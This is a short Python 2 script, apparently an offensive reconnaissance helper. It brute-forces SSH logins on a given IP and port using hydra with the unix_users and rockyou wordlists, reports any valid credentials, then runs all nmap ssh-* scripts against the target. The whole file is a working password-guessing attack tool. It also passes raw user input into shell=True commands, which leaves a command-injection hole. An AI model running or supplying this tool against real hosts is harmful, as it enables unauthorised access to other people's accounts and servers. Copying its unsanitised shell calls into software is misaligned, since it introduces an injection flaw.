#!/usr/bin/env python
import subprocess
import sys

if len(sys.argv) != 3:
    print "Usage: sshrecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

print "INFO: Performing hydra ssh scan against " + ip_address 
HYDRA = "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -f -o ./results/{0}/{0}_sshhydra.txt -u {0} -s {1} ssh".format(ip_address, port)
try:
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
            print "[*] Valid ssh credentials found: " + result
except:
    print "INFO: No valid ssh credentials found"

print "INFO: Performing nmap SSH script scan for " + ip_address + ":" + port
SSHSCAN = "nmap -sV -Pn -vv -p {0} --script=ssh-* -oN './results/{1}/{1}_ssh.nmap' {1}".format(port, ip_address)
results = subprocess.check_output(SSHSCAN, shell=True)
outfile = "results/{0}/{0}_sshrecon.txt".format(ip_address)
f = open(outfile, "w")
f.write(results)
f.close